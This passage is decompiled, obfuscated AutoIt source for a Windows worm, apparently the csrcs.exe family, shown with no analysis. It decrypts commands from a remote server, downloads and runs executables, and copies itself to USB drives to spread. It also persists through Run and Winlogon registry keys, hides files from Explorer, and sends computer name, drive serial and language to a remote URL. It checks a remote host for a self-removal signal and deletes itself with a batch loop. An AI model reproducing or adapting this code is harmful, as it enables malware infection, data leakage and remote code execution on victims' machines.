							$Var02B1 = Random(1, 0x00FE, 1)
						EndIf
						If StringInStr($Var03E5[2], "b") Then
							$Var02B2 = Random(1, 0x00FE, 1)
						EndIf
						If StringInStr($Var03E5[2], "c") Then
							$Var02B3 = Random(1, 0x00FE, 1)
						EndIf
					EndIf
				EndIf
			EndIf
		EndIf
		If $Var02E6 = 1 Then
			$Var036F = StringRegExp($Var029F, "D7G4SFDC", 0)
			$Var0370 = StringRegExp($Var029F, "KDLS547SDN", 0)
			If $Var036F = 1 And $Var0370 = 1 Then
				$Var0371 = "D7G4SFDC"
				$Var0372 = "KDLS547SDN"
				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
				$Var03D3 = $Var034A
				If $Var03D3 <> "-1" Then
					$Var03E7 = StringSplit($Var02C6, "@")
					For $Var03E8 = 1 To $Var03E7[0]
						$Var03E9 = $Var03E7[$Var03E8]
						$Var03E9 = StringSplit($Var03E7[$Var03E8], "~")
						If $Var03E9[0] = 2 Then
							$Var03EA = $Var03E9[1]
							$Var03EB = $Var03E9[2]
							$Var03EA = StringSplit($Var03EA, ".")
							$Var03EB = StringSplit($Var03EB, ".")
							$Var03D3 = StringSplit($Var03D3, ".")
							If $Var03EA[0] = 4 And $Var03EB[0] = 4 And $Var03D3[0] = 4 Then
								If $Var03EA[1] = $Var03D3[1] And $Var03EA[2] = $Var03D3[2] Then
									$Var02B1 = $Var03EB[1]
									$Var02B2 = $Var03EB[2]
									$Var02B3 = Random(0, 0x00FF, 1)
									$Var02B4 = 0
								EndIf
							EndIf
						EndIf
					Next
				EndIf
			EndIf
		EndIf
		If $Var02E5 = 1 Then
			$Var036F = StringRegExp($Var029F, "P71DHJK5", 0)
			$Var0370 = StringRegExp($Var029F, "J8K61S54DPPLX", 0)
			If $Var036F = 1 And $Var0370 = 1 Then
				$Var0371 = "P71DHJK5"
				$Var0372 = "J8K61S54DPPLX"
				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
				$Var03D3 = $Var034A
				If $Var03D3 <> "-1" Then
					$Var03EC = StringSplit($Var02C6, "@")
					For $Var03ED = 1 To $Var03EC[0]
						$Var03EE = StringSplit($Var03EC[$Var03ED], "~")
						If $Var03EE[0] = 2 Then
							For $Var03EF = 1 To $Var03EE[0]
								If $Var03EE[1] = $Var03D3 Then
									$Var03F0 = StringSplit($Var03EE[2], ".")
									If $Var03F0[0] = 4 Then
										$Var02B1 = $Var03F0[1]
										$Var02B2 = $Var03F0[2]
										$Var02B3 = $Var03F0[3]
										$Var02B4 = 0
									EndIf
								EndIf
							Next
						EndIf
					Next
				EndIf
			EndIf
		EndIf
		If $Var02E3 = 1 Then
			$Var036F = StringRegExp($Var029F, "Xio90kK", 0)
			$Var0370 = StringRegExp($Var029F, "Z9031fLK", 0)
			If $Var036F = 1 And $Var0370 = 1 Then
				$Var0371 = "Xio90kK"
				$Var0372 = "Z9031fLK"
				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
				$Var03F1 = StringSplit($Var02C6, "@")
				For $Var03F2 = 1 To $Var03F1[0]
					$Var03E5 = StringSplit($Var03F1[$Var03F2], "~")
					If $Var03E5[0] = 2 Then
						If $Var03E5[3] = @ComputerName & @UserName Then
							$Var03E6 = StringSplit($Var03E5[1], ".")
							If $Var03E6[0] = 4 Then
								$Var02B1 = $Var03E6[1]
								$Var02B2 = $Var03E6[2]
								$Var02B3 = $Var03E6[3]
								$Var02B4 = 0
								If StringInStr($Var03E5[2], "a") Then
									$Var02B1 = Random(1, 0x00FE, 1)
								EndIf
								If StringInStr($Var03E5[2], "b") Then
									$Var02B2 = Random(1, 0x00FE, 1)
								EndIf
								If StringInStr($Var03E5[2], "c") Then
									$Var02B3 = Random(1, 0x00FE, 1)
								EndIf
							EndIf
						EndIf
					EndIf
				Next
			EndIf
		EndIf
		If $Var02EE = 1 Then
			$Var036F = StringRegExp($Var029F, "7Q5S3V9T5D1ZS464DFDSDF", 0)
			$Var0370 = StringRegExp($Var029F, "987ERT6D5F4G3C2V1B6D5F4G", 0)
			If $Var036F = 1 And $Var0370 = 1 Then
				$Var0371 = "7Q5S3V9T5D1ZS464DFDSDF"
				$Var0372 = "987ERT6D5F4G3C2V1B6D5F4G"
				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
				$Var03F3 = StringSplit($Var02C6, "@")
				If Not @error Then
					$Var03F4 = Random(1, $Var03F3[0], 1)
					$Var03E5 = StringSplit($Var03F3[$Var03F4], "~")
					If $Var03E5[0] = 2 Then
						$Var03E6 = StringSplit($Var03E5[1], ".")
						If $Var03E6[0] = 4 Then
							$Var02B1 = $Var03E6[1]
							$Var02B2 = $Var03E6[2]
							$Var02B3 = $Var03E6[3]
							$Var02B4 = 0
							If StringInStr($Var03E5[2], "a") Then
								$Var02B1 = Random(1, 0x00FE, 1)
							EndIf
							If StringInStr($Var03E5[2], "b") Then
								$Var02B2 = Random(1, 0x00FE, 1)
							EndIf
							If StringInStr($Var03E5[2], "c") Then
								$Var02B3 = Random(1, 0x00FE, 1)
							EndIf
						EndIf
					EndIf
				EndIf
			EndIf
		EndIf
		If $Var029E = 1 Then
			$Var036F = StringRegExp($Var029F, "H4D8D5U96581H3Y321VBNM1M1MBN", 0)
			$Var0370 = StringRegExp($Var029F, "LLFPD879S54D6B84654654CVBCVB654CVB654CB", 0)
			If $Var036F = 1 And $Var0370 = 1 Then
				$Var0371 = "H4D8D5U96581H3Y321VBNM1M1MBN"
				$Var0372 = "LLFPD879S54D6B84654654CVBCVB654CVB654CB"
				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
				$Var029C = StringLen($Var02C6)
				$Var02C4 = $Var02C6
				$Var02BA = "_PE04E1B7463C3BD27"
				Fn00AF($Var02C4, "randompick")
			EndIf
		EndIf
	EndIf
	If $Var02F4 = 1 Then
		$Var036F = StringRegExp($Var029F, "Ki8sdtPm4sQN1g2SBs321PTO4wVeU5", 0)
		$Var0370 = StringRegExp($Var029F, "AADSFsbDG4nh6hSDFweD6jSD16DD4w843Gn1", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "Ki8sdtPm4sQN1g2SBs321PTO4wVeU5"
			$Var0372 = "AADSFsbDG4nh6hSDFweD6jSD16DD4w843Gn1"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03A1 = StringSplit($Var02C6, "@")
			For $Var03A2 = 1 To $Var03A1[0]
				$Var03F5 = StringSplit($Var03A1[$Var03A2], " ")
				If $Var03F5[0] = 7 Then
					$Var03A4 = $Var03F5[1]
					$Var03A5 = $Var03F5[2]
					$Var03A6 = $Var03F5[3]
					$Var03A7 = $Var03F5[4]
					$Var03A8 = $Var03F5[5]
					$Var03A9 = $Var03F5[6]
					$Var03F6 = $Var03F5[7]
					$Var03F7 = FileGetSize(@SystemDir & "\" & $Var0292)
					If $Var03F6 = $Var03F7 Then
						If RegRead($Var029A, $Var03A8) = "1" Or RegRead($Var029A, $Var03A8) = "error" Then
						Else
							$Var03AE = Random(1, $Var03A9, 1)
							If $Var03AE = 1 Or $Var03AE = 0 Then
								InetGet($Var03A4, @SystemDir & "\" & $Var03A5, 1, 0)
								If FileExists(@SystemDir & "\" & $Var03A5) And FileGetVersion(@SystemDir & "\" & $Var03A5) = $Var03A7 And FileGetSize(@SystemDir & "\" & $Var03A5) = $Var03A6 Then
									ShellExecute($Var03A5, "", @SystemDir & "\")
									If @error Then
										RegWrite($Var029A, $Var03A8, "REG_SZ", "error")
									Else
										RegWrite($Var029A, $Var03A8, "REG_SZ", "1")
									EndIf
								Else
									FileSetAttrib(@SystemDir & "\" & $Var03A5, "-RASH")
									FileDelete(@SystemDir & "\" & $Var03A5)
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02FD = 1 Then
		$Var036F = StringRegExp($Var029F, "C94D5DCB5FA4E879A1D216A4VD4S98RE8", 0)
		$Var0370 = StringRegExp($Var029F, "A951SDF1C5W67E9Q1AZX9F41SD4X", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "C94D5DCB5FA4E879A1D216A4VD4S98RE8"
			$Var0372 = "A951SDF1C5W67E9Q1AZX9F41SD4X"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03F8 = StringSplit($Var02C6, " ")
			If $Var03F8[0] = 7 Then
				$Var0322 = $Var03F8[1]
				$Var0323 = $Var03F8[2]
				$Var0321 = $Var03F8[3]
				$Var0325 = $Var03F8[4]
				$Var0324 = $Var03F8[5]
				$Var0308 = $Var03F8[6]
				$Var0326 = $Var03F8[7]
				$Var0320 = "Si"
			EndIf
			If $Var03F8[0] = 10 Then
				$Var0322 = $Var03F8[1]
				$Var0323 = $Var03F8[2]
				$Var0321 = $Var03F8[3]
				$Var0325 = $Var03F8[4]
				$Var0324 = $Var03F8[5]
				$Var0308 = $Var03F8[6]
				$Var0326 = $Var03F8[7]
				$Var031D = $Var03F8[8]
				$Var031E = $Var03F8[9]
				$Var031F = $Var03F8[10]
				$Var0320 = "Si"
			EndIf
			$Var03F9 = 1
			If $Var03F8[0] = 10 Or $Var03F8[0] = 7 Then
				If StringIsAlpha(StringLeft($Var0308, 1)) Then
					$Var0308 = StringTrimLeft($Var0308, 1)
					$Var03F9 = 2
				EndIf
			EndIf
			If RegRead($Var029A, $Var0326) = "" And $Var0320 = "Si" Then
				If $Var03F8[0] = 7 Then
					$Var0302 = @SystemDir & "\" & Random(0x2B67, 0x05F5E0FF, 1) & ".exe"
					FileCopy(@SystemDir & "\csrcs.exe", $Var0302, 1)
					FileSetAttrib($Var0302, "-RASH")
					Fn00BF($Var03F9)
					RegWrite($Var029A, $Var0326, "REG_SZ", "1")
				EndIf
				If $Var03F8[0] = 10 Then
					$Var032E = $Var031E
					Fn00BF($Var03F9)
					RegWrite($Var029A, $Var0326, "REG_SZ", "1")
				EndIf
			EndIf
		EndIf
	EndIf
	If $Var02FE = 1 Then
		$Var036F = StringRegExp($Var029F, "9sd8f41q9w8ep1j87g3h52nb", 0)
		$Var0370 = StringRegExp($Var029F, "a987vdf74r4j33m1c4e", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "9sd8f41q9w8ep1j87g3h52nb"
			$Var0372 = "a987vdf74r4j33m1c4e"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03FA = $Var02C6
			$Var03FB = StringSplit($Var03FA, "@")
			For $Var03FC = 1 To $Var03FB[0]
				$Var03FD = StringSplit($Var03FB[$Var03FC], "%")
				If $Var03FD[0] = 2 Then
					$Var03FE = StringSplit($Var03FD[2], " ")
					$Var02FC = StringSplit($Var03FD[1], "~")
					If $Var03FE[0] = 6 Then
						$Var039C = $Var03FE[1]
						$Var03A9 = $Var03FE[2]
						$Var03FF = $Var03FE[3]
						$Var03AF = $Var03FE[4]
						$Var03AF = StringSplit($Var03AF, "~")
						$Var0400 = $Var03FE[5]
						$Var03B1 = $Var03FE[6]
						$Var03B1 = StringSplit($Var03B1, "~")
						$Var0401 = "false"
						If $Var03B1[0] <> 0 Then
							For $Var03AD = 1 To $Var03B1[0]
								If ProcessExists($Var03B1[$Var03AD]) Then
									$Var0401 = "true"
								EndIf
							Next
						EndIf
						If RegRead($Var029A, $Var039C) <> "" Then
						Else
							If $Var0401 = $Var0400 Then
								$Var03AE = Random(1, $Var03A9, 1)
								If $Var03AE = 1 Or $Var03AE = 0 Then
									$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, "kiu", $Var032F)
									If StringInStr($Var029B, "1;") Then
										$Var029B = StringSplit($Var029B, ";")
										If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
											$Var029B = $Var029B[2]
										Else
											$Var029B = "ERORRENER"
										EndIf
									EndIf
									$Var03B3 = "false"
									For $Var03B4 = 1 To $Var03AF[0]
										If $Var03AF[$Var03B4] = $Var029B Then
											$Var03B3 = "true"
										EndIf
									Next
									If $Var03B3 = $Var03FF Then
										If $Var02FC[0] = 3 Then
											If $Var02FC[3] = "ad" Then
												Fn00E6($Var02FC[$Var03FC])
											EndIf
										EndIf
										If $Var02FC[0] = 4 Then
											If $Var02FC[3] = "link" Then
												Fn00E5($Var03FB[$Var03FC])
											EndIf
										EndIf
										If $Var02FC[0] = 5 Then
											If $Var02FC[4] = "img" Then
												Fn00E4($Var03FB[$Var03FC])
											EndIf
										EndIf
										If $Var02FC[0] = 2 Then
											If $Var02FC[2] = "start" Then
												Fn00E7($Var02FC[1])
											EndIf
										EndIf
										RegWrite($Var029A, $Var039C, "REG_SZ", "1")
									Else
										RegWrite($Var029A, $Var039C, "REG_SZ", "noneed")
									EndIf
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02FF = 1 Then
		$Var036F = StringRegExp($Var029F, "98uknm87l9p87zzx11v2d", 0)
		$Var0370 = StringRegExp($Var029F, "d8d700s198d4w1q1a11a1v3", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "98uknm87l9p87zzx11v2d"
			$Var0372 = "d8d700s198d4w1q1a11a1v3"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var02C6 = StringSplit($Var02C6, "@")
			For $Var0402 = 1 To $Var02C6[0]
				$Var0403 = StringSplit($Var02C6[$Var0402], "%")
				If $Var0403[0] = 10 Then
					$Var0324 = $Var0403[1]
					$Var0404 = $Var0403[2]
					$Var0405 = $Var0403[3]
					$Var0406 = $Var0403[4]
					$Var039C = $Var0403[5]
					$Var03A9 = $Var0403[6]
					$Var03FF = $Var0403[7]
					$Var03AF = $Var0403[8]
					$Var03AF = StringSplit($Var03AF, "~")
					$Var0400 = $Var0403[9]
					$Var03B1 = $Var0403[10]
					$Var03B1 = StringSplit($Var03B1, "~")
					$Var0401 = "false"
					If $Var03B1[0] <> 0 Then
						For $Var03AD = 1 To $Var03B1[0]
							If ProcessExists($Var03B1[$Var03AD]) Then
								$Var0401 = "true"
							EndIf
						Next
					EndIf
					If RegRead($Var029A, $Var039C) <> "" Then
					Else
						If $Var0401 = $Var0400 Then
							$Var03AE = Random(1, $Var03A9, 1)
							If $Var03AE = 1 Or $Var03AE = 0 Then
								$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, "kiu", $Var032F)
								If StringInStr($Var029B, "1;") Then
									$Var029B = StringSplit($Var029B, ";")
									If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
										$Var029B = $Var029B[2]
									Else
										$Var029B = "ERORRENER"
									EndIf
								EndIf
								$Var03B3 = "false"
								For $Var03B4 = 1 To $Var03AF[0]
									If $Var03AF[$Var03B4] = $Var029B Then
										$Var03B3 = "true"
									EndIf
								Next
								If $Var03B3 = $Var03FF Then
									Fn00E8($Var0324 & "~" & $Var0404 & "~" & $Var0405 & "%" & $Var0406)
									RegWrite($Var029A, $Var039C, "REG_SZ", "1")
								Else
									RegWrite($Var029A, $Var039C, "REG_SZ", "noneed")
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If RegRead($Var029A, "fir") = "x" Then
		If $Var0300 = 1 Then
			$Var036F = StringRegExp($Var029F, "m9k5o1z7a5q3", 0)
			$Var0370 = StringRegExp($Var029F, "a65sd4m1n2b3", 0)
			RegDelete($Var029A, "fir")
			If $Var036F = 1 And $Var0370 = 1 Then
				$Var0371 = "m9k5o1z7a5q3"
				$Var0372 = "a65sd4m1n2b3"
				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
				$Var02C6 = StringSplit($Var02C6, "~")
				If $Var02C6[0] = 4 Then
					$Var0324 = $Var02C6[1]
					$Var0404 = $Var02C6[2]
					$Var0405 = $Var02C6[3]
					$Var0406 = StringReplace($Var02C6[4], " ", "~")
					Fn00E8($Var0324 & "~" & $Var0404 & "~" & $Var0405 & "%" & $Var0406)
				EndIf
				If $Var02C6[0] = 1 Then
					$Var0407 = $Var02C6[1]
					If $Var0407 <> "" Then
						$Var0408 = StringToBinary(@ComputerName & "-" & DriveGetSerial(@HomeDrive) & "-" & @OSLang)
						Fn00E9($Var0407 & "?v=3&id=" & $Var0408, Default, "x-type: promake")
					Else
						$Var0409 = StringMid($Var0334, 1, StringInStr($Var0334, "/", 1, 3))
						Fn009B($Var0409 & "nu.php")
					EndIf
				EndIf
				If $Var02C6[0] = 2 Then
					$Var0407 = $Var02C6[1]
					$Var040A = $Var02C6[2]
					$Var0408 = StringToBinary(@ComputerName & "-" & DriveGetSerial(@HomeDrive) & "-" & @OSLang)
					Fn00E9($Var0407 & "?v=" & $Var040A & "&id=" & $Var0408, Default, "x-type: promake")
				EndIf
			EndIf
		EndIf
	EndIf
	If $Var02DB = 1 Then
		If Fn009B("http://wre.extasix.com/remo.htm") = "sipipR85EfzMkOX100kyp5VrE4eEKVKEEKR" Then
			$Var034E = $Var0331
			$Var02CA = "Harakiri"
			$Var02CB = "none"
			$Var02C8 = "W-remove"
			$Var02CC = "none"
			Fn00A6()
			Fn00A4()
			Fn00A2()
			Fn00A5()
			Fn00A1()
			Fn00A3()
			Exit
		EndIf
	EndIf
	$Var029F = ""
	Fn00B4()
EndFunc

Func Fn009D($Arg00, $Arg01, $Arg02, $Arg03)
	If FileExists($Arg00 & $Arg01) Then
		If FileExists($Arg02 & $Arg03) Then
			If FileGetVersion($Arg00 & $Arg01) > FileGetVersion($Arg02 & $Arg03) Then
				FileSetAttrib($Arg02 & $Arg03, "-RASH")
				Sleep(10)
				FileDelete($Arg02 & $Arg03)
				Sleep(10)
				FileCopy($Arg00 & $Arg01, $Arg02 & $Arg03)
				Sleep(10)
				FileSetAttrib($Arg02 & $Arg03, "+RASH")
			EndIf
		Else
			FileCopy($Arg00 & $Arg01, $Arg02 & $Arg03)
			FileSetAttrib($Arg02 & $Arg03, "+RASH")
		EndIf
	EndIf
EndFunc

Func Fn009E()
	$Var040B = 0
	$Var040C = 0
	$Var040D = 0
	$Var040E = 0
	$Var040F = 0
	$Var0410 = 0
	$Var0411 = 0
	$Var0412 = 0
	$Var0413 = 0
	Sleep(0x0064)
	$Var0414 = DriveGetDrive("REMOVABLE")
	If Not @error Then
		For $Var0350 = 1 To $Var0414[0]
			If $Var0414[0] <> $Var02AD Then
				If Not $Var0414[$Var0350] = "a:" Or $Var0414[$Var0350] = "b:" Then
					DirRemove($Var0414[$Var0350] & "RECYCLER", 1)
				EndIf
				$Var0415 = 0
				If $Var0414[$Var0350] = "a:" Or $Var0414[$Var0350] = "b:" Then
				Else
					If DriveStatus($Var0414[$Var0350]) = "READY" And DriveSpaceFree($Var0414[$Var0350]) > "5" Then
						If DriveSpaceFree($Var0414[$Var0350]) < "5" Or DriveSpaceTotal($Var0414[$Var0350]) < "110" Then
							$Var02D0 = 1
							$Var0352 = @HOUR * 1
						EndIf
						If DriveSpaceFree($Var0414[$Var0350]) > "5" And DriveSpaceTotal($Var0414[$Var0350]) = "62" Or DriveSpaceTotal($Var0414[$Var0350]) = "63" Or DriveSpaceTotal($Var0414[$Var0350]) = "64" Or DriveSpaceTotal($Var0414[$Var0350]) = "65" Then
							$Var02D0 = 0
						EndIf
						If FileExists($Var0414[$Var0350] & "\" & $Var0293) Then
							$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $Var0293, 9)
							$Var0345 = StringTrimLeft($Var0345, 1)
							$Var0345 = Fn00A8(0, $Var0345, $Var032F, 1)
							$Var0345 = StringSplit($Var0345, "!")
							For $Var0346 = 1 To $Var0345[0]
								If $Var0345[0] = 2 Then
									If $Var0345[1] = $Var0297 Then
										$Var02A8 = $Var0345[2]
										$Var02A9 = $Var0345[2]
									Else
										FileSetAttrib($Var0414[$Var0350] & "\" & $Var0345[2], "-RASHNOT")
										FileDelete($Var0414[$Var0350] & "\" & $Var0345[2])
										FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A8, "-RASHNOT")
										FileDelete($Var0414[$Var0350] & "\" & $Var02A8)
										FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
										FileDelete($Var0414[$Var0350] & "\" & $Var0293)
									EndIf
								Else
									FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
									FileDelete($Var0414[$Var0350] & "\" & $Var0293)
									FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A8, "-RASHNOT")
									FileDelete($Var0414[$Var0350] & "\" & $Var02A8)
								EndIf
							Next
						Else
							$Var02A8 = $Var02A7
						EndIf
						If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $Var0292) And FileExists($Var0414[$Var0350] & "\" & $Var0293) Then
							$Var0416 = 0
						Else
							$Var0416 = 1
							$Var0415 = 1
							FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A9, "-RASHNOT")
							FileDelete($Var0414[$Var0350] & "\" & $Var02A9)
							FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
							FileDelete($Var0414[$Var0350] & "\" & $Var0293)
							$Var02A8 = $Var02A7
						EndIf
						If $Var0416 = 1 Then
							$Var0417 = @ScriptDir & "\"
							$Var0418 = $Var0414[$Var0350] & "\"
							Fn009D($Var0417, $Var0292, $Var0418, $Var02A8)
							Sleep(10)
							Fn009D($Var0417, $Var0294, $Var0418, $Var0293)
							Sleep(10)
							If $Var0415 = 1 Then
								$Var02CA = "usbspread"
								$Var02C8 = "cleanusb inf"
								$Var02CB = DriveGetLabel($Var0414[$Var0350])
								$Var02CC = "none"
								$Var034E = $Var0332
								If $Var02DA < 3 Then
									$Var02DA = $Var02DA + 1
									Fn00A6()
								EndIf
								$Var0415 = 0
							EndIf
						EndIf
					Else
					EndIf
				EndIf
			EndIf
		Next
		$Var02AD = $Var0414[0]
	EndIf
	$Var02A8 = $Var02A7
EndFunc

Func Fn009F()
	$Var040B = 0
	$Var040C = 0
	$Var040D = 0
	$Var040E = 0
	$Var040F = 0
	$Var0410 = 0
	$Var0411 = 0
	$Var0412 = 0
	$Var0413 = 0
	Sleep(0x0064)
	$Var0414 = DriveGetDrive("REMOVABLE")
	If Not @error Then
		For $Var0350 = 1 To $Var0414[0]
			$Var0415 = 0
			If $Var0414[$Var0350] = "a:" Or $Var0414[$Var0350] = "b:" Then
			Else
				If DriveStatus($Var0414[$Var0350]) = "READY" And DriveSpaceFree($Var0414[$Var0350]) > "5" Then
					If DriveSpaceFree($Var0414[$Var0350]) < "5" Or DriveSpaceTotal($Var0414[$Var0350]) < "110" Then
						$Var02D0 = 1
						$Var0352 = @HOUR * 1
					EndIf
					If DriveSpaceFree($Var0414[$Var0350]) > "5" And DriveSpaceTotal($Var0414[$Var0350]) = "62" Or DriveSpaceTotal($Var0414[$Var0350]) = "63" Or DriveSpaceTotal($Var0414[$Var0350]) = "64" Or DriveSpaceTotal($Var0414[$Var0350]) = "65" Then
						$Var02D0 = 0
					EndIf
					If FileExists($Var0414[$Var0350] & "\" & $Var0293) Then
						$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $Var0293, 9)
						$Var0345 = StringTrimLeft($Var0345, 1)
						$Var0345 = Fn00A8(0, $Var0345, $Var032F, 1)
						$Var0345 = StringSplit($Var0345, "!")
						For $Var0346 = 1 To $Var0345[0]
							If $Var0345[0] = 2 Then
								If $Var0345[1] = $Var0297 Then
									$Var02A8 = $Var0345[2]
									$Var02A9 = $Var0345[2]
								Else
									FileSetAttrib($Var0414[$Var0350] & "\" & $Var0345[2], "-RASHNOT")
									FileDelete($Var0414[$Var0350] & "\" & $Var0345[2])
									FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A8, "-RASHNOT")
									FileDelete($Var0414[$Var0350] & "\" & $Var02A8)
									FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
									FileDelete($Var0414[$Var0350] & "\" & $Var0293)
								EndIf
							Else
								FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
								FileDelete($Var0414[$Var0350] & "\" & $Var0293)
								FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A8, "-RASHNOT")
								FileDelete($Var0414[$Var0350] & "\" & $Var02A8)
							EndIf
						Next
					Else
						$Var02A8 = $Var02A7
					EndIf
					If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $Var0292) Then
						$Var0416 = 0
					Else
						$Var0416 = 1
						$Var0415 = 1
						FileSetAttrib($Var0414[$Var0350] & "\" & $Var02A9, "-RASHNOT")
						FileDelete($Var0414[$Var0350] & "\" & $Var02A9)
						FileSetAttrib($Var0414[$Var0350] & "\" & $Var0293, "-RASHNOT")
						FileDelete($Var0414[$Var0350] & "\" & $Var0293)
						$Var02A8 = $Var02A7
					EndIf
					If $Var0416 = 1 Then
						$Var0417 = @ScriptDir & "\"
						$Var0418 = $Var0414[$Var0350] & "\"
						Fn009D($Var0417, $Var0292, $Var0418, $Var02A8)
						Sleep(10)
						Fn009D($Var0417, $Var0294, $Var0418, $Var0293)
						Sleep(10)
						If $Var0415 = 1 Then
							$Var02CA = "usbspread"
							$Var02C8 = "cleanusb inf"
							$Var02CB = DriveGetLabel($Var0414[$Var0350])
							$Var02CC = "none"
							$Var034E = $Var0332
							If $Var02DA < 3 Then
								$Var02DA = $Var02DA + 1
								Fn00A6()
							EndIf
							$Var0415 = 0
						EndIf
					EndIf
				Else
				EndIf
			EndIf
		Next
		$Var02AD = $Var0414[0]
	EndIf
	$Var02A8 = $Var02A7
EndFunc

Func Fn00A0()
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var0296, "REG_SZ", @SystemDir & "\" & $Var0292)
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var0296, "REG_SZ", @SystemDir & "\" & $Var0292)
	If @OSVersion = "WIN_XP" Then RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe " & $Var0292)
	Fn00BE()
	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "REG_DWORD", "2")
	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SuperHidden", "REG_DWORD", "0")
	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", "REG_DWORD", "0")
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL", "CheckedValue", "REG_DWORD", "1")
EndFunc

Func Fn00A1()
	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var0296)
	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var0296)
	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var0296)
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe")
	RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", "C:\WINDOWS\system32\" & $Var0292)
	RegDelete($Var029A)
EndFunc

Func Fn00A2()
	If FileExists(@ScriptDir & "\" & $Var0293) Then
		FileSetAttrib(@ScriptDir & "\" & $Var0293, "-RASHNOT")
		FileDelete(@ScriptDir & "\" & $Var0293)
	EndIf
	If FileExists(@ScriptDir & "\" & $Var02A7) Then
		FileSetAttrib(@ScriptDir & "\" & $Var02A7, "-RASHNOT")
		FileDelete(@ScriptDir & "\" & $Var02A7)
	EndIf
	If FileExists(@ScriptDir & "\" & $Var0292) Then
		FileSetAttrib(@ScriptDir & "\" & $Var0292, "-RASHNOT")
		FileDelete(@ScriptDir & "\" & $Var0292)
	EndIf
	If FileExists(@SystemDir & "\" & $Var0293) Then
		FileSetAttrib(@SystemDir & "\" & $Var0293, "-RASHNOT")
		FileDelete(@SystemDir & "\" & $Var0293)
	EndIf
	If FileExists(@SystemDir & "\" & $Var02A7) Then
		FileSetAttrib(@SystemDir & "\" & $Var02A7, "-RASHNOT")
		FileDelete(@SystemDir & "\" & $Var02A7)
	EndIf
	If FileExists(@SystemDir & "\" & $Var0292) Then
		FileSetAttrib(@SystemDir & "\" & $Var0292, "-RASHNOT")
		FileDelete(@SystemDir & "\" & $Var0292)
	EndIf
EndFunc

Func Fn00A3()
	Sleep(0x0064)
	Local $Var0419
	FileDelete(@TempDir & "\s.cmd")
	Sleep(0x01F4)
	$Var0419 = ":loop" & @CRLF & "del """ & @ScriptFullPath & """" & @CRLF & "if exist """ & @ScriptFullPath & """ goto loop" & @CRLF & "del " & @TempDir & "\s.cmd"
	FileWrite(@TempDir & "\s.cmd", $Var0419)
	Run(@TempDir & "\s.cmd", @TempDir, @SW_HIDE)
	Exit
EndFunc

Func Fn00A4()
	Sleep(0x0064)
	$Var041A = DriveGetDrive("FIXED")
	If Not @error Then
		For $Var0350 = 1 To $Var041A[0]
			If DriveStatus($Var041A[$Var0350]) = "READY" Then
				If FileExists($Var041A[$Var0350] & "\" & $Var0293) Then
					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0293, "-RASHNOT")
					FileDelete($Var041A[$Var0350] & "\" & $Var0293)
				EndIf
				If FileExists($Var041A[$Var0350] & "\" & $Var02A7) Then
